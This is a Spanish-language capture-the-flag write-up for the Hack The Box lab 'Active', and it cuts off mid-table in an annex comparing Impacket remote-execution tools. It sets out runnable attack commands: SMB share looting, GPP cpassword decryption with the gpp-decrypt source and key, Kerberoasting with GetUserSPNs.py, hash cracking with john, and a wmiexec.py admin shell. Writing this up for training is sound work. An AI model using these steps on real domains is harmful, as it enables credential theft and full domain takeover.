---
title: "HTB: Resolución de Active"
date: 2023-07-20 12:00:00 +/-TTTT
categories: [HTB, Active Directory]
tags: [kerberoasting, gpp-password, gpp-decrypt, crackmapexec, smbmap, smbclient, getuserspns.py, john, wmiexec.py]     ## TAG names should always be lowercase
image: active.png
img_path: /photos/2023-07-20-Active-WriteUp/
---

**Active** es una máquina **fácil** de Hack The Box que pone a prueba habilidades realistas en el compromiso de entornos de **Active Directory**. Comienza con el descubrimiento de un archivo mal asegurado ***Groups.xml*** en un recurso compartido de SMB. Esta debilidad permite obtener las primeras credenciales a través de las **Group Policy Preferences (GPP)**. Posteriormente, la escalada de privilegios se logra mediante un ataque de **Kerberoasting**, que desemboca en el acceso como **Administrador del dominio**. 

Adicionalmente, este análisis cuenta con un [Anexo](#anexo-i-comparativa-entre-de-psexecpy-smbexecpy-y-wmiexecpy) donde se **examinan** detalladamente las herramientas de ejecución remota de comandos de Impacket **psexec.py**, **smbexec.py** y **wmiexec.py**. Se exploran las operaciones subyacentes que cada herramienta realiza, las huellas que potencialmente podrían dejar en la máquina objetivo, y se realiza una comparativa entre ellas para determinar sus ventajas y desventajas respectivas en diferentes contextos.

## Reconocimiento

En esta etapa, nos esforzamos por recopilar la mayor cantidad de información posible sobre nuestro objetivo.

### Identificación del Sistema Operativo con Ping

Empezamos por realizar un _**ping**_ a la máquina víctima. La finalidad del _ping_ no es solamente confirmar la conectividad, sino también deducir el sistema operativo que la máquina víctima está utilizando. ¿Cómo lo hace? Por medio del _**Time to Live (TTL)**_.

El _**TTL**_ indica cuánto tiempo o "saltos" debe permanecer el paquete en la red antes de que se descarte. Los sistemas operativos establecen diferentes valores predeterminados de TTL para los paquetes que salen, por lo que podemos usar el TTL para obtener una idea del sistema operativo del host remoto.

En este caso, un _**TTL**_ menor o igual a **64** generalmente indica que la máquina es **Linux** y un _**TTL**_ menor o igual a **128** indica que la máquina es **Windows**.

```bash
r1pfr4n@parrot> ping -c 1 10.10.10.100

PING 10.10.10.100 (10.10.10.100) 56(84) bytes of data.
64 bytes from 10.10.10.100: icmp_seq=1 ttl=127 time=108 ms

--- 10.10.10.100 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 107.556/107.556/107.556/0.000 ms
```

Observamos que el _**TTL**_ es 127, lo que sugiere que nos enfrentamos a una máquina **Windows**.

### Descubrimiento de puertos

El próximo paso en nuestro proceso de exploración es descubrir los puertos abiertos en la máquina víctima. Para ello, utilizamos la herramienta **nmap**. Nmap nos permite identificar los **puertos abiertos** (status open) en la máquina, que podrían ser potenciales vectores de ataque.

El comando que utilizamos es bastante detallado y hace uso de varias opciones de nmap:

-   `-sS`: Realiza un escaneo SYN. Este es un tipo de escaneo sigiloso que no completa las conexiones TCP a los puertos del host objetivo.
-   `--min-rate 5000`: Establece el número mínimo de paquetes que nmap intentará enviar por segundo.
-   `-n`: No resuelve los nombres de los hosts.
-   `-Pn`: Trata al host como si estuviera en línea y omite la fase de descubrimiento.
-   `-p-`: Escanea todos los puertos (equivalente a `-p 1-65535`).
-   `-vvv`: Aumenta la verbosidad del programa. 
-   `--open`: Muestra solo los puertos abiertos.
-   `-oG allPorts`: Guarda la salida en formato *greppable*, que es más fácil de procesar con otros programas y scripts (este formato lo utilizo para poder filtrar los puertos abiertos de los resultados del escaneo mediante expresiones regulares).

Aquí están los resultados:

```bash
r1pfr4n@parrot> sudo nmap -sS --min-rate 5000 -n -Pn -p- -vvv --open 10.10.10.100 -oG allPorts

...[snip]...
Nmap scan report for 10.10.10.100
Host is up, received user-set (0.11s latency).
Scanned at 2023-07-18 23:02:37 CEST for 18s
Not shown: 64491 closed tcp ports (reset), 1022 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5722/tcp  open  msdfsr           syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49152/tcp open  unknown          syn-ack ttl 127
49153/tcp open  unknown          syn-ack ttl 127
49154/tcp open  unknown          syn-ack ttl 127
49155/tcp open  unknown          syn-ack ttl 127
49157/tcp open  unknown          syn-ack ttl 127
49158/tcp open  unknown          syn-ack ttl 127
49165/tcp open  unknown          syn-ack ttl 127
49168/tcp open  unknown          syn-ack ttl 127
49176/tcp open  unknown          syn-ack ttl 127
...[snip]...
```

Tras descubrir los puertos abiertos, procedemos a realizar un **escaneo más detallado** para conocer las versiones y los servicios que se están ejecutando en esos puertos.

```bash
r1pfr4n@parrot> sudo nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,49152,49153,49154,49155,49157,49158,49165,49168,49176 10.10.10.100 -oN targeted

...[snip]...
Nmap scan report for 10.10.10.100
Host is up (0.11s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-18 21:03:46Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49168/tcp open  msrpc         Microsoft Windows RPC
49176/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-07-18T21:04:41
|_  start_date: 2023-07-18T21:01:14
|_clock-skew: -1s
| smb2-security-mode: 
|   210: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.29 seconds
```

El comando `-sCV` realiza un escaneo de versión (-sV) y ejecuta *scripts* por defecto (-sC).

El resultado de este escaneo revela información adicional sobre los servicios en ejecución, como versiones y detalles de la configuración. A continuación, se proporciona un desglose detallado de los servicios que se han identificado en la máquina objetivo utilizando una tabla. Para cada servicio, se describe brevemente su propósito y su relevancia potencial.

| Puerto(s)                                | Servicio                          | Descripción                                                                                                                     | Relevancia                                                                                                                                     |
| ---------------------------------------- | --------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------- |
| 53                                       | Domain (DNS)                      | El servicio DNS se utiliza para resolver nombres de dominio en direcciones IP y viceversa.                                      | Las configuraciones incorrectas o las entradas DNS malintencionadas pueden ser explotadas.                                                     |
| 88                                       | Kerberos                          | Kerberos es un protocolo de autenticación de red.                                                                               | Las vulnerabilidades o debilidades en Kerberos pueden permitir la escalada de privilegios o la falsificación de identidad.                     |
| 135, 5722, 49152-49158,49165,49168,49176 | MSRPC                             | Microsoft Remote Procedure Call (RPC) permite a los procesos comunicarse en una red.                                            | Los problemas de configuración o las vulnerabilidades en RPC pueden permitir la ejecución remota de código.                                    |
| 139/445                                  | NetBIOS-ssn/Microsoft-ds          | NetBIOS y SMB son protocolos de compartición de archivos y servicios.                                                           | Las vulnerabilidades en SMB pueden permitir la ejecución remota de código, la escalada de privilegios o la revelación de información sensible. |
| 389/636, 3268/3269                       | LDAP/LDAP SSL/Global Catalog LDAP | El Protocolo Ligero de Acceso a Directorios (LDAP) se utiliza para acceder y gestionar directorios distribuidos sobre redes IP. | Las configuraciones incorrectas o las vulnerabilidades en LDAP pueden permitir la enumeración de usuarios o la escalada de privilegios.        |
| 464                                      | kpasswd5                          | Este puerto está asociado con el servicio de cambio de contraseña de Kerberos.                                                  | Las vulnerabilidades asociadas pueden permitir la modificación de contraseñas de usuario.                                                      |
| 593                                      | ncacn_http                        | Puntos de extremo de mapeo para RPC sobre HTTP.                                                                                 | Las vulnerabilidades o problemas de configuración pueden permitir la ejecución remota de código.                                               |
| 9389                                     | .NET Message Framing              | Este puerto se utiliza para la comunicación en el marco de mensajes .NET.                                                       | Las vulnerabilidades pueden permitir ataques de inyección de código o la ejecución remota de código.                                           |

### Puertos 139/445 abiertos (SMB)

**El protocolo SMB (Server Message Block)**, que opera a través de los puertos 139 y 445, se selecciona para un reconocimiento inicial por su relevancia en la configuración de redes Windows y su conocido historial de vulnerabilidades explotables.

SMB es un protocolo de red que proporciona servicios compartidos de archivos e impresoras. Aunque es un componente esencial en los sistemas operativos Windows, también puede encontrarse en otras plataformas.

Para empezar, se utiliza la herramienta `crackmapexec` para recopilar más información sobre el servicio SMB que se ejecuta en la máquina objetivo. El comando utilizado es el siguiente:

```bash
r1pfr4n@parrot> crackmapexec smb 10.10.10.100
```

La ejecución de este comando arroja el siguiente resultado:

![imagen 2](Pasted image 20230718231014.png)

Aquí, vemos que el nombre de la máquina es **"DC"**, está utilizando el dominio **"active.htb"**, y tiene habilitada la opción de firmado SMB (**signing: True**). También podemos observar que la versión de Windows es **6.1**, que corresponde a **Windows Server 2008 R2**, como se puede consultar en [esta página](https://www.gaijin.at/en/infos/windows-version-numbers). No se detecta el uso del antiguo protocolo SMBv1.

Para facilitar trabajos futuros, se añade el dominio "active.htb" al archivo `/etc/hosts` para permitir que se resuelva localmente:

![imagen 3](Pasted image 20230719164349.png)

A continuación, se intenta listar los recursos compartidos disponibles a través de una sesión de invitado con `crackmapexec`:

```bash
r1pfr4n@parrot> crackmapexec smb 10.10.10.100 -u '' -p '' --shares
```

El resultado es el siguiente:

![imagen 4](Pasted image 20230718231850.png)

Aquí, podemos ver varios recursos compartidos típicos en un entorno de Windows:

- **ADMIN$**: Es un recurso compartido administrativo que normalmente apunta al directorio `Windows`. Generalmente, este recurso compartido es accesible solo para usuarios con privilegios administrativos.
- **C\$**: Es el recurso compartido por defecto del directorio raíz del sistema. Al igual que el recurso compartido ADMIN\$, el acceso a C\$ normalmente está restringido a los administradores.
- **IPC\$**: Este recurso compartido permite la comunicación entre procesos. Es importante en la ejecución de tareas o servicios remotos y también puede proporcionar información útil durante la enumeración de un sistema.
- **NETLOGON** y **SYSVOL**: Son recursos compartidos especiales que existen en los controladores de dominio de Windows. NETLOGON normalmente contiene scripts de inicio de sesión, mientras que SYSVOL almacena los archivos del sistema de políticas de grupo.

Además, podemos observar un recurso compartido llamado **"Replication"** que tiene **permisos de lectura**. Este recurso compartido no es un recurso compartido predeterminado y podría **contener información valiosa**.

#### Descarga del recurso compartido Replication

Para explorar este recurso compartido "Replication", se utiliza la herramienta `smbmap` con una consulta recursiva:

```bash
r1pfr4n@parrot> smbmap -H 10.10.10.100 -u '' -R Replication
```

El contenido de la carpeta **Replication** muestra una estructura compleja de carpetas anidadas dentro de otras. Para facilitar su exploración, se utiliza `smbclient` para conectarse de manera interactiva al recurso compartido y descargar su contenido de forma recursiva.

El comando para iniciar la sesión interactiva es el siguiente:

```bash
r1pfr4n@parrot> smbclient //10.10.10.100/Replication -N
```

En la sesión interactiva, se ejecutan varios comandos para descargar el contenido de Replication:

```bash
smb: \> mask ""
smb: \> prompt OFF
smb: \> recurse ON
smb: \> mget *
```

Estos comandos realizan lo siguiente:

- `mask ""`: Se utiliza para establecer el patrón de coincidencia para los archivos a descargar. Al usar una cadena vacía, se seleccionan todos los archivos.
- `prompt OFF`: Desactiva el mensaje de confirmación antes de descargar cada archivo.
- `recurse ON`: Habilita la descarga recursiva de archivos y subcarpetas.
- `mget *`: Inicia la descarga de todos los archivos y carpetas seleccionados.

El contenido de "Replication" se descarga en el directorio desde el que se ejecutó `smbclient`. Si se quisiera cambiar el directorio de guardado, se podría usar el comando `lcd` seguido de la ruta del directorio deseado.

Resultado de la ejecución:


![imagen 5](Pasted image 20230718231926.png)

### Análisis de la carpeta active.htb

Tras la descarga, se inicia la exploración de la carpeta `active.htb` que estaba contenida en "Replication". Esta carpeta presenta una estructura similar al recurso **SYSVOL** de un controlador de dominio de Windows. En estos recursos, se puede encontrar a veces un **archivo** llamado `groups.xml` que **podría contener credenciales**.

El recurso **SYSVOL** es un directorio compartido que guarda los archivos del sistema de políticas de grupo y los scripts de inicio de sesión. La estructura típica de un recurso SYSVOL suele contener directorios como "scripts" y "Policies". El directorio "Policies" contiene un subdirectorio para cada política de grupo, identificado por un GUID único. Cada uno de estos subdirectorios incluye los archivos de configuración y datos necesarios para aplicar la política.

La estructura de la carpeta `active.htb` se muestra a continuación:

```bash
r1pfr4n@parrot> tree
.
└── active.htb
    ├── DfsrPrivate
    │   ├── ConflictAndDeleted
    │   ├── Deleted
    │   └── Installing
    ├── Policies
    │   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
    │   │   ├── GPT.INI
    │   │   ├── Group Policy
    │   │   │   └── GPE.INI
    │   │   ├── MACHINE
    │   │   │   ├── Microsoft
    │   │   │   │   └── Windows NT
    │   │   │   │       └── SecEdit
    │   │   │   │           └── GptTmpl.inf
    │   │   │   ├── Preferences
    │   │   │   │   └── Groups
    │   │   │   │       └── Groups.xml
    │   │   │   └── Registry.pol
    │   │   └── USER
    │   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
    │       ├── GPT.INI
    │       ├── MACHINE
    │       │   └── Microsoft
    │       │       └── Windows NT
    │       │           └── SecEdit
    │       │               └── GptTmpl.inf
    │       └── USER
    └── scripts

22 directories, 7 files
```

Notablemente, se encuentra un archivo `Groups.xml` bajo el directorio `active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups`. Dado que estos archivos pueden contener credenciales, es importante investigarlos con más detalle.

#### Descifrando credenciales GPP

Primero, se analiza el contenido del archivo `Groups.xml` con el siguiente comando:

```bash
cat active.htb/Policies/\{31B2F340-016D-11D2-945F-00C04FB984F9\}/MACHINE/Preferences/Groups/Groups.xml
```

Su contenido es:

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
    <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" 
          name="active.htb\SVC_TGS" 
          image="2" 
          changed="2018-07-18 20:46:06" 
          uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
        <Properties action="U" 
                    newName="" 
                    fullName="" 
                    description="" 
                    cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" 
                    changeLogon="0" 
                    noChange="1" 
                    neverExpires="1" 
                    acctDisabled="0" 
                    userName="active.htb\SVC_TGS"/>
    </User>
</Groups>
```

Este contenido sugiere que tenemos las credenciales de un usuario, específicamente `active.htb\SVC_TGS`, y una contraseña encriptada: `edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`.

Esta contraseña encriptada se conoce como una **contraseña de preferencias de política de grupo (GPP)**. Microsoft usó una clave simétrica para encriptar estas contraseñas, y la **clave** fue **revelada públicamente**. 

Para descifrar la contraseña, se puede usar una herramienta llamada `gpp-decrypt`. Esta es una herramienta escrita en Ruby, incluida en las distribuciones Kali y Parrot, **diseñada para descifrar las contraseñas de GPP**. Su código se muestra a continuación:

```ruby
#!/usr/bin/ruby
require 'rubygems'
require 'openssl'
require 'base64'

unless ARGV.length == 1
  puts "Usage: #{File.basename($0)}: encrypted_data"
  exit
end

encrypted_data = ARGV[0]

#encrypted_data = "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"

def decrypt(encrypted_data)
padding = "=" * (4 - (encrypted_data.length % 4))
epassword = "#{encrypted_data}#{padding}"
decoded = Base64.decode64(epassword)

key = "\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
aes = OpenSSL::Cipher::Cipher.new("AES-256-CBC")
aes.decrypt
aes.key = key
plaintext = aes.update(decoded)
plaintext << aes.final
pass = plaintext.unpack('v*').pack('C*') ## UNICODE conversion

return pass
end

blah = decrypt(encrypted_data)
puts blah 
```

En el script se puede observar la clave simétrica que Microsoft utilizó originalmente para encriptar las contraseñas GPP:  

`\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b`. 

Ejecutando el comando `gpp-decrypt` con la contraseña encriptada:

```bash
r1pfr4n@parrot> gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

Se obtiene la contraseña descifrada: `GPPstillStandingStrong2k18`:

![imagen 6](Pasted image 20230718232405.png)

Por lo tanto, las credenciales del usuario `active.htb\SVC_TGS` son: `GPPstillStandingStrong2k18`.

Para confirmar la validez de estas credenciales, se puede utilizar la herramienta `crackmapexec`:

```bash
r1pfr4n@parrot> crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
```

Si en el resultado de este comando aparece un "**+**", significa que las credenciales son válidas

![imagen 7](Pasted image 20230718232701.png)

Con las credenciales de un usuario del dominio (`active.htb\SVC_TGS:GPPstillStandingStrong2k18`), se abren **varias posibilidades para la enumeración** y **potenciales ataques**.

Es posible enumerar el servicio RPC (Remote Procedure Call) para obtener los usuarios del dominio y, en un escenario adecuado, **podría ser factible explotar un ataque ASREPRoasting**.

Sin embargo, en este caso específico, no existe **ningún usuario** susceptible a un ataque **ASREPRoasting**, motivo por el cual este tipo de ataque no se explorará en detalle en este WriteUp.

Por otro lado, las credenciales de dominio adquiridas también abren la puerta para realizar un ataque **Kerberoasting**, siendo esta la **vía de explotación que se llevará a cabo para resolver la máquina** en cuestión.

Para aquellos interesados en entender cómo se **enumeraría el servicio RPC** y cómo se llevaría a cabo un **ataque ASREPRoasting** en circunstancias apropiadas, se recomienda visitar el **WriteUp de Forest** en el siguiente enlace: [Forest WriteUp](https://ripfran.github.io/posts/Forest-WriteUp/).

## Obteniendo shell como Administrador del dominio

A continuación, en el proceso de resolución de la máquina, el objetivo se centrará en **explotar** una vulnerabilidad conocida como **Kerberoasting**. Al explotar exitosamente este ataque, se obtendrán las **credenciales del Administrador del dominio**, lo que proporcionará un acceso directo y completo a la máquina objetivo.

### Kerberoasting en detalle

**Kerberoasting** es una técnica de ataque que aprovecha el protocolo de autenticación Kerberos de Windows para extraer **hashes de contraseñas de cuentas de servicio**. Este ataque se realiza solicitando tickets de servicio (TGS, Ticket-Granting Service) para todas las cuentas de servicio disponibles en el dominio. Posteriormente, estos tickets pueden ser descifrados fuera de línea para obtener los hashes de las contraseñas correspondientes.

La autenticación Kerberos se realiza en tres pasos principales:

1. **Autenticación inicial:** Cuando un usuario inicia sesión, su contraseña se convierte en una clave secreta que se utiliza para cifrar y descifrar mensajes. El usuario solicita un ticket de concesión de ticket (TGT, Ticket-Granting Ticket) al Centro de Distribución de Claves (KDC). Este verifica las credenciales del usuario y, si son correctas, emite un TGT cifrado.
    
2. **Obtención del Ticket de Servicio (TGS):** Cuando el usuario desea acceder a un servicio, presenta su TGT al KDC junto con una solicitud de un ticket para ese servicio específico. El KDC verifica el TGT y, si es válido, emite un ticket de servicio.
    
3. **Acceso al servicio:** El usuario presenta el ticket de servicio al servidor que aloja el servicio solicitado. Si el ticket es válido, el servidor otorga el acceso al servicio.
    

El ataque de **Kerberoasting** se aprovecha del segundo paso, la obtención del Ticket de Servicio. Los **TGS** están **cifrados con la contraseña del servicio al que brindan acceso**. Un atacante puede solicitar estos tickets, incluso sin autenticarse, y luego intentar descifrarlos fuera de línea. **Si la contraseña es débil, el atacante puede descifrarla utilizando un ataque de fuerza bruta**.

Por tanto, Kerberoasting es un **ataque de post-explotación**. Esto significa que **requiere que el atacante ya tenga acceso a una cuenta en el dominio** (aunque no necesariamente sea una cuenta con privilegios). Además, Kerberoasting se aprovecha de una característica intrínseca de Kerberos y no es algo que pueda ser "parcheado" o "arreglado".

![imagen 8](Pasted image 20230718053428.png)

En la próxima sección, se detallará cómo se realizó un ataque de **Kerberoasting en la máquina objetivo**.

### Explotación de Kerberoasting para obtener las credenciales de Administrator

El Kerberoasting es una técnica que se puede explotar para obtener contraseñas de cuentas de servicio no convencionales, aquellas que se configuran con la opción `ServicePrincipalName` (SPN). Un SPN es esencialmente un identificador único asignado a un servicio que se ejecuta en un servidor dentro de un dominio de Active Directory. Este identificador permite a los clientes de la red identificar y autenticarse con ese servicio.

En este caso, la explotación comienza con las credenciales ya conocidas del usuario **SVC_TGS**, `SVC_TGS:GPPstillStandingStrong2k18`. Las credenciales del usuario **SVC_TGS** nos proporcionan una base de entrada inicial en el dominio.

Con estas credenciales, podemos solicitar los Tickets de Concesión de Servicio (TGS) para las cuentas de servicio configuradas con un SPN en el dominio utilizando la herramienta **GetUserSPNs.py**. El comando utilizado es el siguiente:

```bash
r1pfr4n@parrot> GetUserSPNs.py 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' -dc-ip 10.10.10.100 -request
```

**GetUserSPNs.py** es una herramienta de [Impacket](https://github.com/fortra/impacket).  

En este comando, `active.htb/SVC_TGS:GPPstillStandingStrong2k18` son las credenciales del usuario de dominio, `-dc-ip 10.10.10.100` especifica la dirección IP del controlador de dominio (DC), y `-request` solicita los TGS para los SPNs.

El resultado devuelto es el siguiente:

![imagen 9](Pasted image 20230718232827.png)

En este resultado, hay información valiosa que merece ser desglosada:

- **ServicePrincipalName:** Aquí se encuentra el nombre del servicio, en este caso `active/CIFS:445`. Este es el nombre que Kerberos utiliza para identificar el servicio específico al que se desea acceder. En este caso, el servicio es CIFS (Common Internet File System), un protocolo que permite el intercambio de archivos y otros recursos entre las máquinas en una red. El número `445` indica el puerto sobre el cual se está ejecutando el servicio.
    
- **Name:** Este es el nombre del usuario que está ejecutando el servicio, en este caso, `Administrator`. Esto es importante porque indica que, si se logra descifrar el TGS, se obtendrá la contraseña de este usuario.
    
- **$krb5tgs...**: Esta es la representación del hash del TGS para el SPN especificado. Este hash se ha cifrado con la contraseña del usuario que ejecuta el servicio (en este caso, `Administrator`), y se puede descifrar para obtener esta contraseña.
    
A continuación se muestra el hash obtenido:

```bash
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$88360cf4aeffe0a3cfe6d87617a81659$154d521092ed5b477cf625dfe3515953f5f7ee12caefd4c5ec58b5e6e75ecf896d05886a1009c9b6a4c876aaae0701a52648da017d06f934e2d8cb73b96524a6b8ee646cf22ec6de1b0694d4b3fc42b3d2b90f1cf847476debb031c03fadb19efd70dd26bea8ef0f1a163f56f00f303a0165d0e82903cd02c772f4a44b7b209358bf9a4cf93950f04fa060f2b522a132cc8781a936206f64738a2e3f095f386516aeed7a17636583e796ead4b3aae9951eefe5f48944d9c034b90177ed1fc0d3c744b766c2852e5a41024fa06748137eea546576e5ae53a6ae95b8dfbf095591fb168f8a90804000037aacd936bd3358ab2677387906b0e14eb278245b22eb85c83beb4f0503a4259ff82741ad1ef4a20c9ca01385ee972698a0c37b9221da066ac5cd9c431f5c56d74ba71d75a5d96130c8a3c036e52da1469ad0b194d5d4e7c794981128a5895d44ef87a2b3e1d3ca0b6353a70d76dd9a8d4b0f004740672bd58c4221dded1fb96fef09d364ae18c65f81e410ab48cf03463553e9c81fdadec14623f0ff5a434557efb9f14263206e13eb192b9921acb57d4107bc00846d14286e67383746ae2818d9dcff63f9eaf0dbd299abf0b3f7a75c00c613cdc9e3b83776105594ed5f4cc7b421037870935810f3eae093dd5b3bcf3f70849fbd02fec3318a0d4ec7aee8163e6b85a4ec3d2ac1d28def0c98eba87a26739ff151a4987fca3ecb860071847de9ae61d1a9fdda564420ecee5ffc1442d384388c40026823e31ff7a04335a9079e95ebdf3a199120724ba3871a809ee8484443d9b20338e39d4a8540c15e2e74c752090334a3be20b89c5c52eb687307c4cee0bae7fa71ba44b73a44da502cdf304bbb0e0e1b5952f1463f56122c66a3a71a8b76be2e97a8ce82f2f98bc5cb02c0ab561ed4d5fb4e280bdce644bc39c4f4cb3c52ebc6925851e584eaeccf550caed516d2b4229618dc3ce72596dbb7992107df95f709afa92174c2f3b3cbdb185783e808d1742d477f8c46827e44ccbe9f0058ed8a5d5c154302b96c3b8c0a6293df88bf4cf041aed6bea63105b759b98dbb6af4c1ac53d2a5b25d4b2d612deb59d9a9b1bff9b6f43b38c0045e7a01d4e08348acb87a14f630846003869160476db81f9ebddc895c5e982ae8d725d92c2bc7a6d16112ee51b1bb9389e0282b46f98b64aad66083993b6d9527810d169a4706ce7b526d74fa7788cc58895452c2fbe3567c0aa82c1dac0c4b855e6fdee06b
```

Este hash de TGS, que contiene la contraseña de la cuenta  **Administrator** cifrada, se guardó en un archivo llamado **hash**. Se usó la herramienta **john**, que es un cracker de contraseñas, para descifrar el hash a través de un ataque por diccionario:

```bash
r1pfr4n@parrot> john -w=/usr/share/wordlists/rockyou.txt hash
```

El resultado es la contraseña `Ticketmaster1968`:

![imagen 10](Pasted image 20230718232934.png)

Para verificar que estas credenciales son válidas, se puede utilizar la herramienta `crackmapexec`. Si las credenciales son correctas, aparecerá un "**+**" indicando que son válidas, y un "**Pwned!**" que indica que se tiene el control total sobre esta cuenta. El comando es el siguiente:

```bash
r1pfr4n@parrot> crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968'
```

Resultado de la ejecución del comando anterior:

![imagen 11](Pasted image 20230718233133.png)

Por último, se utilizará la herramienta `wmiexec.py` para acceder a la máquina con las credenciales obtenidas. Es importante mencionar que, aunque en este caso se ha optado por utilizar `wmiexec.py`, también se podrían haber utilizado otras herramientas de Impacket como `psexec.py` o `smbexec.py` para la ejecución remota de comandos. Un desglose detallado de estas tres herramientas, sus diferencias y similitudes, así como los rastros que dejan en el sistema remoto, se puede encontrar en el [Anexo I](#anexo-i-comparativa-entre-de-psexecpy-smbexecpy-y-wmiexecpy) de este documento.

```bash
r1pfr4n@parrot> wmiexec.py 'Administrator:Ticketmaster1968@10.10.10.100'
```

Después de ejecutar este comando, se obtendrá una shell como Administrador del dominio:

![imagen 12](Pasted image 20230720124353.png)

### user.txt y root.txt

Con el acceso directo como Administrador del dominio, es posible acceder a las dos flags. La primera, `user.txt`, se ubica en el directorio `Desktop` del usuario `SVC_TGS`:

```powershell
C:\> type C:\Users\SVC_TGS\Desktop\user.txt
66ce43f2808fa85a2592530c91ad329a
```

Este es el contenido de la flag `user.txt`, que valida la obtención de acceso como usuario de dominio.

La segunda flag, `root.txt`, está situada en el directorio `Desktop` del usuario `Administrator`:

```powershell
C:\> type C:\Users\Administrator\Desktop\root.txt
8779ea6715ee85557ccc6ba69a52230a
```

Esta es la flag `root.txt`, que confirma la obtención de acceso con privilegios de Administrador del dominio. Con esto, se concluye con éxito la resolución de la máquina.

## Anexo I: Comparativa entre de psexec.py, smbexec.py y wmiexec.py

Las herramientas **psexec.py**, **smbexec.py** y **wmiexec.py** son scripts de **Impacket** que permiten la **ejecución de comandos en una máquina remota**. Aunque estas tres tienen el mismo objetivo, cada una de ellas utiliza un método diferente para lograrlo y deja diferentes huellas en el sistema. En este anexo, se exploran en profundidad las **diferencias y similitudes entre estas herramientas**.

A continuación, se presenta una descripción muy general de las tres utilidades:

| Herramienta | Método de ejecución |
|-------------|---------------------|
| psexec.py   | Escribe un binario en el recurso compartido ADMIN$ y crea un servicio para ejecutar comandos. |
| smbexec.py  | Crea servicios que ejecutan comandos enviados por el atacante. |
| wmiexec.py  | Utiliza WMI para ejecutar comandos y escribe la salida en un archivo en el recurso compartido ADMIN$. |

Para utilizar cualquiera de estas tres herramientas, **se requieren privilegios elevados en el sistema remoto**. Aunque **psexec.py**, **smbexec.py** y **wmiexec.py** pueden utilizar diferentes métodos para ejecutar comandos en el sistema remoto, todas ellas necesitan permisos suficientes para interactuar con los servicios del sistema, crear archivos temporales o escribir en ciertos recursos compartidos.

A continuación, se presenta una tabla que resume sus diferencias y similitudes:

| Herramienta | Requiere acceso de escritura a un recurso compartido | Tipo RCE | Crea un servicio | Crea un binario | Limpieza automática | Nivel de acceso | Puertos utilizados |
|-------------|-----------------------------------------------------|------------------|-----------------|---------------------|-----------------|-------------------|
